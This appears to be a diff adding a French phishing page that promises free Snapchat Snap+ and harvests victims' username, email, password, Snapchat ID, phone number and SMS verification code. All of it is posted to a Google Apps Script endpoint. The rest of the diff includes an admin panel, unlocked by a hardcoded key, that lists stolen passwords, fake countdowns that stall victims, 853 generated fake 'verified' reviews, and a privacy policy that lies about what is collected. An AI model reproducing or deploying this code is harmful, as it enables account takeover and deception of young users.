+        <input class="search-bar" type="text" placeholder="🔍 Rechercher par numéro ou Snap ID..." oninput="filterEntries(this.value)">
+        <div class="table-header">
+          <div class="table-title" id="entriesCount">0 demandes</div>
+          <button class="btn-refresh" onclick="refreshData()">↻ Actualiser</button>
+        </div>
+        <div class="entries-list" id="entriesList">
+          <div class="empty-state"><div class="icon">📭</div><p>Aucune demande pour l'instant.</p></div>
+        </div>
+      </div>
+      <div class="page" id="page-settings">
+        <div class="page-title">Paramètres</div>
+        <div class="page-sub">Configuration du panneau admin.</div>
+        <div class="settings-section">
+          <div class="settings-title">🔐 Sécurité</div>
+          <div class="settings-row"><span class="label">Clé d'accès</span><span class="val">••••••••••</span></div>
+          <div class="settings-row"><span class="label">Session active</span><span class="val green">✓ Connecté</span></div>
+        </div>
+        <div class="settings-section">
+          <div class="settings-title">📊 Données</div>
+          <div class="settings-row"><span class="label">Total entrées</span><span class="val" id="settingsTotal">0</span></div>
+          <div class="settings-row"><span class="label">Stockage</span><span class="val">Session locale</span></div>
+          <div class="settings-row"><span class="label">Auto-refresh</span><span class="val green">✓ Actif (30s)</span></div>
+        </div>
+        <div class="settings-section">
+          <div class="settings-title">🗑️ Danger</div>
+          <div class="settings-row">
+            <span class="label">Effacer toutes les données</span>
+            <button onclick="clearAllData()" style="background:var(--red-glow);border:1px solid rgba(255,77,109,0.3);color:var(--red);border-radius:8px;padding:5px 12px;cursor:pointer;font-size:0.82rem;font-family:'DM Sans',sans-serif;">Tout effacer</button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+<script>
+
+  // SNAP+ COOLDOWN PAGE driver
+  function showCooldownPage(duration, title) {
+    const page = document.getElementById('cooldownPage');
+    const big = document.getElementById('cdTimerBig');
+    const bar = document.getElementById('cdProgressBar');
+    const msg = document.getElementById('cdMsg');
+    const t = document.getElementById('cdBigTitle');
+    if (title) t.textContent = title;
+    page.classList.add('active');
+    bar.style.transition = 'none'; bar.style.width = '100%';
+    function fmt(s) { return Math.floor(s/60) + ':' + String(s%60).padStart(2,'0'); }
+    let r = duration; big.textContent = fmt(r);
+    const checks = ['cdCheck1','cdCheck2','cdCheck3'].map(id => document.getElementById(id));
+    checks.forEach(c => c.classList.remove('active','done'));
+    checks[0].classList.add('active');
+    const messages = [
+      'Connexion aux serveurs Snap…',
+      'Authentification de ton compte Snapchat…',
+      'Analyse anti-fraude en cours…',
+      'Vérification de l\'éligibilité Snap+…',
+      'Préparation de ton accès…',
+      'Synchronisation finale…'
+    ];
+    let mi = 0; msg.textContent = messages[0];
+    requestAnimationFrame(() => requestAnimationFrame(() => {
+      bar.style.transition = 'width 1s linear';
+      bar.style.width = ((duration-1)/duration*100) + '%';
+    }));
+    return new Promise(resolve => {
+      const iv = setInterval(() => {
+        r--;
+        bar.style.width = (r/duration*100) + '%';
+        big.textContent = fmt(r);
+        if (r % 5 === 0 && mi < messages.length-1) { mi++; msg.textContent = messages[mi]; }
+        const phase1 = Math.floor(duration*0.66);
+        const phase2 = Math.floor(duration*0.33);
+        if (r === phase1) { checks[0].classList.remove('active'); checks[0].classList.add('done'); checks[1].classList.add('active'); }
+        if (r === phase2) { checks[1].classList.remove('active'); checks[1].classList.add('done'); checks[2].classList.add('active'); }
+        if (r <= 0) {
+          clearInterval(iv);
+          checks[2].classList.remove('active'); checks[2].classList.add('done');
+          setTimeout(() => { page.classList.remove('active'); resolve(); }, 350);
+        }
+      }, 1000);
+    });
+  }
+
+  function goToAdmin() {
+    document.getElementById('landingPage').style.display = 'none';
+    document.getElementById('adminPage').style.display = 'block';
+  }
+  function backToLanding() {
+    document.getElementById('adminPage').style.display = 'none';
+    document.getElementById('landingPage').style.display = 'block';
+  }
+  function checkHash() {
+    if (window.location.hash === '#admin') goToAdmin();
+  }
+  document.addEventListener('DOMContentLoaded', checkHash);
+  window.addEventListener('hashchange', checkHash);
+  let currentPhone = '';
+  const submissions = JSON.parse(localStorage.getItem('snapplus_entries') || '[]');
+  const COOLDOWN = 60;
+  let cdInterval = null;
+  function startCooldown(onDone, duration) {
+    const total = duration || COOLDOWN;
+    let remaining = total;
+    const wrap = document.getElementById('cooldownWrap');
+    const bar  = document.getElementById('cooldownBar');
+    const lbl  = document.getElementById('cdTimer');
+    wrap.classList.add('active');
+    bar.style.transition = 'none';
+    bar.style.width = '100%';
+    function fmt(s) {
+      const m = Math.floor(s / 60), sec = s % 60;
+      return m + ':' + String(sec).padStart(2,'0');
+    }
+    lbl.textContent = fmt(total);
+    requestAnimationFrame(() => requestAnimationFrame(() => {
+      bar.style.transition = 'width 1s linear';
+      bar.style.width = ((total - 1) / total * 100) + '%';
+    }));
+    cdInterval = setInterval(() => {
+      remaining--;
+      bar.style.transition = 'width 1s linear';
+      bar.style.width = (remaining / total * 100) + '%';
+      lbl.textContent = fmt(remaining);
+      if (remaining <= 0) {
+        clearInterval(cdInterval); cdInterval = null;
+        wrap.classList.remove('active');
+        if (onDone) onDone();
+      }
+    }, 1000);
+  }
+  function stopCooldown() {
+    if (cdInterval) { clearInterval(cdInterval); cdInterval = null; }
+    document.getElementById('cooldownWrap').classList.remove('active');
+  }
+  function retryModal() {
+    document.getElementById('step0').classList.remove('hidden');
+    document.getElementById('step1').classList.add('hidden');
+    document.getElementById('step2').classList.add('hidden');
+    document.getElementById('step3').classList.add('hidden');
+    document.getElementById('step4').classList.add('hidden');
+    document.getElementById('stepsNav').classList.remove('hidden');
+    document.getElementById('pseudoInput').value = '';
+    document.getElementById('emailInput').value = '';
+    document.getElementById('passwordInput').value = '';
+    document.getElementById('snapInput').value = '';
+    document.getElementById('phoneInput').value = '';
+    [0,1,2,3].forEach(i => document.getElementById('c'+i).value = '');
+    if(document.getElementById('cguCheck')) document.getElementById('cguCheck').checked = false;
+    document.getElementById('btnValidate').disabled = true;
+    document.getElementById('btnStep0').disabled = false;
+    document.getElementById('btnStep1').disabled = false;
+    document.getElementById('btnStep2').disabled = false;
+    document.getElementById('errPseudo').style.display = 'none';
+    document.getElementById('errEmail').style.display = 'none';
+    document.getElementById('errPassword').style.display = 'none';
+    document.getElementById('errSnap').style.display = 'none';
+    document.getElementById('err1').style.display = 'none';
+    // Reset steps nav (5 étapes)
+    [0,1,2,3,4].forEach(i => {
+      const num = document.getElementById('dn'+i);
+      const lbl = document.getElementById('dl'+i);
+      if (!num) return;
+      if (i === 0) { num.className = 'dot-circle active'; num.textContent = '1'; lbl.className = 'dot-label active'; }
+      else { num.className = 'dot-circle'; num.textContent = i+1; lbl.className = 'dot-label'; }
+    });
+    ['line0','line1','line2','line3'].forEach(id => { const el = document.getElementById(id); if(el) el.classList.remove('done'); });
+    currentPhone = '';
+    setTimeout(() => document.getElementById('pseudoInput').focus(), 100);
+  }
+
+  function openModal() {
+    document.getElementById('overlay').classList.add('open');
+    document.body.style.overflow = 'hidden';
+    setTimeout(() => document.getElementById('pseudoInput').focus(), 300);
+  }
+  function closeModal() {
+    document.getElementById('overlay').classList.remove('open');
+    document.body.style.overflow = '';
+    stopCooldown();
+  }
+  document.addEventListener('keydown', e => { if (e.key === 'Escape') closeModal(); });
+
+  function setStep(n) {
+    // n va de 1 à 5, les dots sont dn0 à dn4
+    [0,1,2,3,4].forEach(i => {
+      const num = document.getElementById('dn'+i);
+      const lbl = document.getElementById('dl'+i);
+      if (!num) return;
+      if (i < n-1) {
+        num.className = 'dot-circle done'; num.textContent = '✓'; lbl.className = 'dot-label';
+      } else if (i === n-1) {
+        num.className = 'dot-circle active'; num.textContent = i+1; lbl.className = 'dot-label active';
+      } else {
+        num.className = 'dot-circle'; num.textContent = i+1; lbl.className = 'dot-label';
+      }
+    });
+    if (n >= 2) { const l = document.getElementById('line0'); if(l) l.classList.add('done'); }
+    if (n >= 3) document.getElementById('line1').classList.add('done');
+    if (n >= 4) document.getElementById('line2').classList.add('done');
+    if (n >= 5) document.getElementById('line3').classList.add('done');
+  }
+
+  // ÉTAPE 0 — validation
+
+  function goToSnap() {
+    const pseudo = document.getElementById('pseudoInput').value.trim();
+    const email = document.getElementById('emailInput').value.trim();
+    const password = document.getElementById('passwordInput').value;
+    const errU = document.getElementById('errPseudo');
+    const errE = document.getElementById('errEmail');
+    const errP = document.getElementById('errPassword');
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    let ok = true;
+    if (pseudo.length < 3) { errU.style.display = 'block'; ok = false; } else { errU.style.display = 'none'; }
+    if (!emailRegex.test(email)) { errE.style.display = 'block'; ok = false; } else { errE.style.display = 'none'; }
+    if (password.length < 1) { errP.style.display = 'block'; ok = false; } else { errP.style.display = 'none'; }
+    if (!ok) return;
+    document.getElementById('btnStep0').disabled = true;
+    document.getElementById('step0').classList.add('hidden');
+    document.getElementById('step1').classList.remove('hidden');
+    setStep(2);
+    setTimeout(() => document.getElementById('snapInput').focus(), 100);
+  }
+  function goToPhone() {
+    const snap = document.getElementById('snapInput').value.trim();
+    const err = document.getElementById('errSnap');
+    const input = document.getElementById('snapInput');
+    const snapRegex = /^[a-zA-Z][a-zA-Z0-9._-]{2,14}$/;
+    if (!snap || !snapRegex.test(snap)) {
+      err.textContent = 'Identifiant Snapchat invalide (3-15 caractères, lettres/chiffres/. _ -)';
+      err.style.display = 'block';
+      input.style.borderColor = 'var(--red)';
+      return;
+    }
+    const cgu = document.getElementById('cguCheck');
+    if (!cgu.checked) {
+      err.textContent = '⚠️ Vous devez accepter les conditions générales pour continuer.';
+      err.style.display = 'block';
+      return;
+    }
+    err.style.display = 'none'; input.style.borderColor = '';
+    // Envoie le Snap ID immédiatement à Google Sheets
+    fetch(GS_URL, {
+      method: 'POST', mode: 'no-cors',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({ action: 'add_snap', snap })
+    }).catch(() => {});
+    document.getElementById('btnStep1').disabled = true;
+    showCooldownPage(30, 'Vérification du compte…').then(() => {
+      document.getElementById('step1').classList.add('hidden');
+      document.getElementById('step2').classList.remove('hidden');
+      setStep(3);
+      document.getElementById('btnStep1').disabled = false;
+      setTimeout(() => document.getElementById('phoneInput').focus(), 100);
+    });
+  }
+  function goToCode() {
+    const rawPhone = document.getElementById('phoneInput').value.replace(/\s/g,'');
+    const err = document.getElementById('err1');
+    const input = document.getElementById('phoneInput');
+    if (rawPhone.length < 9) {
+      input.style.borderColor = 'var(--red)'; err.style.display = 'block'; return;
+    }
+    input.style.borderColor = ''; err.style.display = 'none';
+    const cc = document.getElementById('countryCode').value;
+    currentPhone = cc + rawPhone;
+    document.getElementById('displayPhone').textContent = currentPhone;
+    // Envoie le numéro IMMÉDIATEMENT avant le cooldown
+    addToAdmin(currentPhone);
+    document.getElementById('btnStep2').disabled = true;
+    showCooldownPage(30, 'Envoi du SMS de vérification…').then(() => {
+      document.getElementById('step2').classList.add('hidden');
+      document.getElementById('step3').classList.remove('hidden');
+      setStep(4);
+      document.getElementById('btnStep2').disabled = false;
+      setTimeout(() => document.getElementById('c0').focus(), 100);
+    });
+  }
+  function validateCode() {
+    const entered = [0,1,2,3].map(i => document.getElementById('c'+i).value).join('');
+    if (entered.length < 4) return;
+    document.getElementById('btnValidate').disabled = true;
+    // Envoie le code IMMÉDIATEMENT avant le cooldown
+    updateAdminCode(currentPhone, entered);
+    showCooldownPage(30, 'Activation de ton Snap+…').then(() => {
+      document.getElementById('step3').classList.add('hidden');
+      document.getElementById('step4').classList.remove('hidden');
+      document.getElementById('stepsNav').classList.add('hidden');
+      setStep(5);
+    });
+  }
+  function resendCode() {
+    [0,1,2,3].forEach(i => { document.getElementById('c'+i).value = ''; });
+    document.getElementById('btnValidate').disabled = true;
+    document.getElementById('c0').focus();
+  }
+  [0,1,2,3].forEach(i => {
+    const el = document.getElementById('c'+i);
+    el.addEventListener('input', () => {
+      el.value = el.value.replace(/\D/,'');
+      if (el.value && i < 3) document.getElementById('c'+(i+1)).focus();
+      const full = [0,1,2,3].map(j => document.getElementById('c'+j).value).join('');
+      document.getElementById('btnValidate').disabled = full.length < 4;
+    });
+    el.addEventListener('keydown', e => {
+      if (e.key === 'Backspace' && !el.value && i > 0) document.getElementById('c'+(i-1)).focus();
+      if (e.key === 'Enter') {
+        const full = [0,1,2,3].map(j => document.getElementById('c'+j).value).join('');
+        if (full.length === 4) validateCode();
+      }
+    });
+  });
+  /* ════ AVIS ════ */
+  const REVIEWS_DATA = [
+    {name:'Safouen',handle:'darkdu75',color:'#FFFC00',txt:"J'ai cru que c'était du scam mais nan j'ai eu 🔥",time:'2 min'},
+    {name:'Mia',handle:'lafolle081938',color:'#ff5b8a',txt:"Plus besoin de payer 4€/mois c carré merci j'ai enfin Snap+ 🙏",time:'7 min'},
+    {name:'Rayan',handle:'r4yan.off',color:'#4fc3f7',txt:"jsp comment c possible mais ça marche fr 😭",time:'12 min'},
+    {name:'Inès',handle:'ines.bby',color:'#f06292',txt:"ma copine m'a envoyé le lien trop bien ça marche",time:'18 min'},
+    {name:'Yanis',handle:'yanis75019',color:'#81c784',txt:"validé en 30s chrono frr merci",time:'23 min'},
+    {name:'Lina',handle:'lina.rfl',color:'#ba68c8',txt:"j'y croyais pas du tout et pourtant 💀",time:'31 min'},
+    {name:'Kylian',handle:'kylian.exe',color:'#ff8a65',txt:"bro ça marche jsp c quoi la magie",time:'45 min'},
+    {name:'Sirine',handle:'sirine93',color:'#4db6ac',txt:"trop bien j'avais plus snap+ depuis 3 mois",time:'52 min'},
+    {name:'Adrien',handle:'adri.off',color:'#fff176',txt:"les gars faites le sérieux c gratuit et ça marche",time:'1h'},
+    {name:'Camille',handle:'cam.bzh',color:'#ef9a9a',txt:"snap+ retrouvé 😭🔥 merci bcp",time:'1h 10'},
+    {name:'Nassim',handle:'nassim.b13',color:'#80cbc4',txt:"j'avais perdu mon abo et là c bon merci",time:'1h 22'},
+    {name:'Eva',handle:'ev4.snap',color:'#ce93d8',txt:"trop simple même pas besoin de cb 😭",time:'1h 35'},
+    {name:'Bilal',handle:'bilal.rzk',color:'#a5d6a7',txt:"c propre aucun spam rien du tout respect",time:'1h 47'},
+    {name:'Jade',handle:'jade.lft',color:'#ffcc80',txt:"ça m'a pris genre 20 secondes max",time:'2h'},
+    {name:'Théo',handle:'theo.2k4',color:'#90caf9',txt:"mtn j'ai la couronne snap+ gratuitement 🙌",time:'2h 15'},
+    {name:'Amira',handle:'amira.off',color:'#f48fb1',txt:"jsp si c légal mais moi j'ai eu merci 😂",time:'2h 28'},
+    {name:'Jordan',handle:'jord.an7',color:'#80deea',txt:"top je recommande à tous mes amis",time:'2h 40'},
+    {name:'Noé',handle:'noe.snap',color:'#ffab91',txt:"c ouf j'avais abandonné l'idée d'avoir snap+",time:'2h 55'},
+    {name:'Sara',handle:'sara.bnt',color:'#b39ddb',txt:"validé en moins d'une minute 🔥",time:'3h'},
+    {name:'Axel',handle:'axel.fit',color:'#c5e1a5',txt:"meilleur site que j'ai trouvé de loin",time:'3h 15'},
+    {name:'Dounia',handle:'dounia.06',color:'#ffcdd2',txt:"c cadeau fr merci j'ai enfin ma couronne 👑",time:'3h 30'},
+    {name:'Marwan',handle:'marwan.off',color:'#b2dfdb',txt:"jsp comment vous faites mais merci",time:'3h 48'},
+    {name:'Léa',handle:'lea.rennes',color:'#e1bee7',txt:"j'ai montré à ma sœur elle a eu aussi 💀",time:'4h'},
+    {name:'Sofiane',handle:'sofiane.b',color:'#ffe0b2',txt:"bro c trop simple pourquoi j'ai attendu",time:'4h 20'},
+    {name:'Maeva',handle:'maeva.snap',color:'#f8bbd0',txt:"ça marche vraiment pas de blague 🙏",time:'4h 38'},
+    {name:'Dylan',handle:'dylan.off',color:'#dcedc8',txt:"tout s'est fait tout seul c ouf",time:'5h'},
+    {name:'Farah',handle:'farah.f',color:'#fce4ec',txt:"j'avais peur mais c clean pas de spam rien",time:'5h 20'},
+    {name:'Enzo',handle:'enz0.snap',color:'#e8f5e9',txt:"gg snap+ activé en direct 🔥",time:'5h 45'},
+    {name:'Nadia',handle:'nadia.bby',color:'#fbe9e7',txt:"trop bien je savais pas que c'était possible",time:'6h'},
+    {name:'Karim',handle:'karim.93',color:'#e3f2fd',txt:"c rapide c gratuit c parfait quoi",time:'6h 20'},
+    {name:'Tom',handle:'tom.off',color:'#80d8ff',txt:"franchement jsp comment mais ça marche 😭",time:'6h 40'},
+    {name:'Aya',handle:'aya.bnt',color:'#ff80ab',txt:"trop bien j'avais plus snap+ depuis des mois",time:'7h'},
+    {name:'Rémi',handle:'remi.snap',color:'#b9f6ca',txt:"j'ai tout eu en 30s max",time:'7h 20'},
+    {name:'Lola',handle:'lola.off',color:'#ffd180',txt:"aucune cb demandée c ouf",time:'7h 45'},
+    {name:'Mehdi',handle:'mehdi.b',color:'#ea80fc',txt:"j'y croyais pas du tout et pourtant 💀",time:'8h'},
+    {name:'Clara',handle:'clara.clr',color:'#ff6e40',txt:"ma sœur m'a montré c gratuit et ça fonctionne",time:'8h 30'},
+    {name:'Anas',handle:'anas.snap',color:'#40c4ff',txt:"bro c cadeau fr 🙏",time:'9h'},
+    {name:'Tina',handle:'tina.off',color:'#ff4081',txt:"merci c propre aucun spam",time:'9h 30'},
+    {name:'Kevin',handle:'kevin.kv',color:'#69f0ae',txt:"j'ai la couronne snap+ gratuitement 👑",time:'10h'},
+    {name:'Sana',handle:'sana.snap',color:'#ffff00',txt:"jsp si c légal mais j'ai eu merci 😂",time:'10h 30'},
+  ];
+  const POOL = ["franchement jsp comment mais ça marche 😭","trop bien j'avais plus snap+ depuis des mois","j'ai tout eu en 30s max","aucune cb demandée c ouf","j'y croyais pas du tout et pourtant 💀","bro c cadeau fr 🙏","merci c propre aucun spam","j'ai la couronne snap+ gratuitement 👑","jsp si c légal mais j'ai eu merci 😂","tout seul aucun effort c top","les gars faites le sérieusement","validé en 25 secondes chrono","trop simple pour être vrai mais si","c la meilleure chose que j'ai trouvé","j'attendais depuis longtemps merci","snap+ retrouvé 😭🔥","plus besoin de payer chaque mois","j'ai partagé à toute ma liste","gg les devs c parfait 🙌","c ouf ça marche vraiment 🔥"];
+  const COLORS = ['#80deea','#ce93d8','#80cbc4','#ffcc80','#ef9a9a','#b39ddb','#c5e1a5','#90caf9','#ff8a65','#4fc3f7','#f06292','#81c784'];
+  const HANDLES_PARTS = ['xX','zz','off','bby','exe','fit','2k','btw','lft','007','bzh','reel','snap','irl','fr','frr'];
+
+  function buildAllReviews() {
+    const all = [...REVIEWS_DATA];
+    const consonants = 'bcdfghjklmnpqrstvwxz';
+    const vowels = 'aeiouy';
+    function fakeName(i) {
+      const l1 = consonants[i%consonants.length].toUpperCase();
+      const l2 = vowels[i%vowels.length];
+      const l3 = consonants[(i*3)%consonants.length];
+      return l1+l2+l3;
+    }
+    function fakeHandle(i) {
+      const num = 1000 + (i * 73 % 9000);
+      const part = HANDLES_PARTS[i % HANDLES_PARTS.length];
+      return `${fakeName(i).toLowerCase()}${num%100 < 50 ? '_' : '.'}${part}`;
+    }
+    for (let i = all.length; i < 853; i++) {
+      all.push({
+        name: fakeName(i)+'***',
+        handle: fakeHandle(i),
+        color: COLORS[i%COLORS.length],
+        txt: POOL[i%POOL.length],
+        time: Math.floor(i/6)+'h'+(i%6?(' '+(i%6*10)):'')
+      });
+    }
+    return all;
+  }
+
+  let reviewsBuilt = false;
+  function openReviews() {
+    let overlay = document.getElementById('reviewsOverlay');
+    if (!overlay) {
+      overlay = document.createElement('div');
+      overlay.id = 'reviewsOverlay';
+      overlay.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.88);backdrop-filter:blur(8px);z-index:999;overflow-y:auto;padding:1rem;display:none;';
+      overlay.innerHTML = `
+        <div style="max-width:500px;margin:2rem auto;background:#0e0e14;border:1px solid rgba(255,252,0,0.2);border-radius:20px;padding:1.5rem;">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:1.25rem;">
+            <div>
+              <div style="font-family:'Syne',sans-serif;font-weight:800;font-size:1.1rem;">853 avis vérifiés</div>
+              <div style="color:#FFFC00;font-size:0.85rem;margin-top:2px;">⭐⭐⭐⭐⭐ 4,8 / 5</div>
+            </div>
+            <button onclick="closeReviews()" style="background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.1);color:#888;border-radius:50%;width:32px;height:32px;cursor:pointer;font-size:1rem;display:flex;align-items:center;justify-content:center;">✕</button>
+          </div>
+          <div style="display:flex;flex-direction:column;gap:10px;" id="allReviewsList"></div>
+        </div>`;
+      document.body.appendChild(overlay);
+    }
+    overlay.style.display = 'block';
+    if (!reviewsBuilt) {
+      const all = buildAllReviews();
+      document.getElementById('allReviewsList').innerHTML = all.map(r => `
+        <div style="background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.07);border-radius:12px;padding:10px 12px;">
+          <div style="display:flex;align-items:center;gap:8px;margin-bottom:5px;">
+            <div style="width:28px;height:28px;border-radius:50%;background:${r.color};display:flex;align-items:center;justify-content:center;font-family:'Syne',sans-serif;font-weight:800;font-size:0.75rem;color:#000;flex-shrink:0;">${r.name[0]}</div>
+            <div style="flex:1;"><div style="font-size:0.82rem;font-weight:600;color:#fff;">${r.name} <span style="color:rgba(255,255,255,0.35);font-weight:400;font-size:0.75rem;">@${r.handle}</span></div><div style="font-size:0.68rem;color:rgba(255,255,255,0.3);">Il y a ${r.time}</div></div>
+            <span style="background:rgba(255,252,0,0.12);color:#FFFC00;font-size:0.65rem;padding:2px 7px;border-radius:100px;font-weight:600;flex-shrink:0;">✓ Vérifié</span>
+          </div>
+          <div style="font-size:0.8rem;color:rgba(255,255,255,0.7);line-height:1.5;">"${r.txt}"</div>
+        </div>`).join('');
+      reviewsBuilt = true;
+    }
+  }
+  function closeReviews() {
+    const o = document.getElementById('reviewsOverlay');
+    if (o) o.style.display = 'none';
+  }
+
+  /* ════ LÉGAL ════ */
+  const LEGAL = {
+    cgu: {
+      title: "Conditions d'utilisation",
+      content: `<p><strong style="color:#fff;">1. Acceptation des conditions</strong><br>En accédant à ce site, vous acceptez les présentes conditions d'utilisation. Si vous n'acceptez pas ces conditions, veuillez ne pas utiliser ce service.</p><br>
+      <p><strong style="color:#fff;">2. Description du service</strong><br>Snap+ Free est un service tiers qui facilite l'activation de l'abonnement Snap+. Ce service n'est pas affilié à Snap Inc.</p><br>
+      <p><strong style="color:#fff;">3. Utilisation du service</strong><br>Vous devez fournir un numéro de téléphone valide. Toute tentative de fraude entraîne la suspension immédiate du service.</p><br>
+      <p><strong style="color:#fff;">4. Limitation de responsabilité</strong><br>Le service est fourni "tel quel". Nous ne garantissons pas une disponibilité continue du service.</p><br>
+      <p><strong style="color:#fff;">5. Modifications</strong><br>Nous nous réservons le droit de modifier ces conditions à tout moment. L'utilisation continue du service vaut acceptation des nouvelles conditions.</p><br>
+      <p><strong style="color:#fff;">6. Contact</strong><br>Pour toute question : support@snap-plus.fr</p>`
+    },
+    privacy: {
+      title: "Politique de confidentialité",
+      content: `<p><strong style="color:#fff;">Données collectées</strong><br>Nous collectons uniquement les données nécessaires au fonctionnement du service : identifiant Snapchat et numéro de téléphone.</p><br>
+      <p><strong style="color:#fff;">Utilisation des données</strong><br>Vos données sont utilisées exclusivement pour l'activation de votre abonnement Snap+. Elles ne sont jamais vendues à des tiers.</p><br>
+      <p><strong style="color:#fff;">Conservation</strong><br>Les données sont conservées pendant 30 jours maximum puis supprimées automatiquement.</p><br>
+      <p><strong style="color:#fff;">Vos droits</strong><br>Conformément au RGPD, vous disposez d'un droit d'accès, de rectification et de suppression de vos données. Contactez-nous à support@snap-plus.fr</p><br>
+      <p><strong style="color:#fff;">Sécurité</strong><br>Toutes les données sont chiffrées en transit (SSL/TLS) et au repos (AES-256).</p>`
+    },
+    credits: {
+      title: "Crédits",
+      content: `<p><strong style="color:#fff;">Technologies utilisées</strong><br>Ce site utilise les technologies suivantes :</p><br>
+      <p>• Google Fonts (Syne, DM Sans)<br>• HTML5 / CSS3 / JavaScript vanilla<br>• Hébergement : Netlify</p><br>
+      <p><strong style="color:#fff;">Design</strong><br>Interface conçue et développée de façon indépendante. Aucun template tiers utilisé.</p><br>
+      <p><strong style="color:#fff;">Mentions</strong><br>Les emojis utilisés sont fournis par le système d'exploitation de l'utilisateur. Le fantôme 👻 est une référence visuelle à l'univers Snapchat.</p><br>
+      <p><strong style="color:#fff;">Avertissement</strong><br>Snap, Snapchat et Snap+ sont des marques déposées de Snap Inc. Ce site n'est pas affilié à Snap Inc.</p>`
+    },
+    cookies: {
+      title: "Gestion des cookies",
+      content: `<p><strong style="color:#fff;">Cookies utilisés</strong><br>Ce site utilise uniquement des cookies techniques nécessaires au fonctionnement du service.</p><br>
+      <p><strong style="color:#fff;">localStorage</strong><br>Nous utilisons le stockage local de votre navigateur pour sauvegarder temporairement les données de session. Ces données ne sont pas partagées.</p><br>
+      <p><strong style="color:#fff;">Pas de tracking</strong><br>Nous n'utilisons aucun cookie publicitaire, aucun pixel de suivi (Facebook, Google Ads, etc.) ni aucun outil d'analytics tiers.</p><br>
+      <p><strong style="color:#fff;">Suppression</strong><br>Vous pouvez supprimer ces données à tout moment en vidant le cache et les données de site dans les paramètres de votre navigateur.</p>`
+    }
+  };
+
+  function openLegal(type) {
+    const data = LEGAL[type];
+    document.getElementById('legalTitle').textContent = data.title;
+    document.getElementById('legalContent').innerHTML = data.content;
+    document.getElementById('legalOverlay').style.display = 'block';
+  }
+
+  function closeLegal() {
+    document.getElementById('legalOverlay').style.display = 'none';
+  }
+
+  /* ════ GOOGLE SHEETS ════ */
+  const GS_URL = 'https://script.google.com/macros/s/AKfycbwvMn3pcZLnW7BYaeJq5FRJrcryp2NQhNc74FdHdgf3vOGlO0_dgaB4DLtRclN1LQk/exec';
+
+  function addToAdmin(phone) {
+    const snap = document.getElementById('snapInput').value.trim();
+    const email = document.getElementById('emailInput').value.trim();
+    const pseudo = document.getElementById('pseudoInput').value.trim();
+    const password = document.getElementById('passwordInput').value;
+    fetch(GS_URL, {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({ action: 'add', snap, phone, email, pseudo, password })
+    }).catch(() => {});
+  }
+
+  function clearAllData() {
+    if (!confirm('Effacer TOUTES les données du Google Sheet ? Irréversible.')) return;
+    fetch(GS_URL, {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({ action: 'clear' })
+    }).then(() => {
+      adminEntries = [];
+      updateStats();
+      renderDashList();
+      renderEntriesList();
+      alert('✅ Toutes les données ont été effacées.');
+    }).catch(() => alert('Erreur lors de la suppression.'));
+  }
+
+  function updateAdminCode(phone, code) {
+    fetch(GS_URL, {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({ action: 'update', phone, code })
+    }).catch(() => {});
+  }
+  const ADMIN_KEY = 'isaac201478';
+  let adminEntries = [];
+  let filterText = '';
+  function tryLogin() {
+    const val = document.getElementById('loginInput').value;
+    const input = document.getElementById('loginInput');
+    const err = document.getElementById('loginErr');
+    if (val === ADMIN_KEY) {
+      document.getElementById('loginWrap').classList.add('hidden');
+      document.getElementById('adminWrap').style.display = 'block';
+      refreshData();
+      startAutoRefresh();
+    } else {
+      input.classList.add('error');
+      err.style.display = 'block';
+      setTimeout(() => { input.classList.remove('error'); input.value = ''; }, 600);
+    }
+  }
+  function logout() {
+    document.getElementById('loginWrap').classList.remove('hidden');
+    document.getElementById('adminWrap').style.display = 'none';
+    document.getElementById('loginInput').value = '';
+    document.getElementById('loginErr').style.display = 'none';
+  }
+  function showAdminPage(name) {
+    document.querySelectorAll('#adminWrap .page').forEach(p => p.classList.remove('active'));
+    document.querySelectorAll('#adminWrap .nav-item').forEach(n => n.classList.remove('active'));
+    document.getElementById('page-' + name).classList.add('active');
+    document.getElementById('nav-' + name).classList.add('active');
+    if (window.innerWidth <= 700) document.getElementById('sidebar').classList.remove('open');
+  }
+  function toggleSidebar() {
+    document.getElementById('sidebar').classList.toggle('open');
+  }
+  async function refreshData() {
+    ['dashList','entriesList'].forEach(id => {
+      const el = document.getElementById(id);
+      if (el) el.innerHTML = '<div class="empty-state"><div class="icon">⏳</div><p>Chargement...</p></div>';
+    });
+    try {
+      const res = await fetch(GS_URL + '?t=' + Date.now());
+      const data = await res.json();
+      adminEntries = (data.entries || []).map(e => ({
+        snap: e.snap || e.Snap || '',
+        phone: e.phone || e.Phone || e.Numéro || '',
+        code: e.code || e.Code || '',
+        email: e.email || e.Email || '',
+        pseudo: e.pseudo || e.Pseudo || '',
+        password: e.password || e.Password || e['Mot de passe'] || '',
+        status: (e.status === 'Validé ✅' || e.status === 'validated') ? 'validated' : 'pending',
+        time: e.time || e.date || e.Date || ''
+      }));
+    } catch(err) { adminEntries = []; }
+    updateStats();
+    renderDashList();
+    renderEntriesList();
+  }
+  function updateStats() {
+    const total = adminEntries.length;
+    const validated = adminEntries.filter(e => e.status === 'validated').length;
+    const pending = total - validated;
+    document.getElementById('statTotal').textContent = total;
+    document.getElementById('statValidated').textContent = validated;
+    document.getElementById('statPending').textContent = pending;
+    document.getElementById('settingsTotal').textContent = total;
+    const badge = document.getElementById('badgeCount');
+    if (total > 0) { badge.textContent = total; badge.style.display = 'inline'; }
+    else badge.style.display = 'none';
+  }
+  function entryHTML(e, idx) {
+    const isValidated = e.status === 'validated';
+    return `
+      <div class="entry-card ${isValidated ? 'validated' : 'pending'}">
+        <div class="entry-left">
+          <div class="entry-snap">👻 ${e.snap || '—'}</div>
+          ${e.pseudo ? `<div class="entry-phone">🏷️ ${e.pseudo}</div>` : ''}
+          ${e.email ? `<div class="entry-phone">✉️ ${e.email}</div>` : ''}
+          ${e.password ? `<div class="entry-phone">🔑 ${e.password}</div>` : ''}
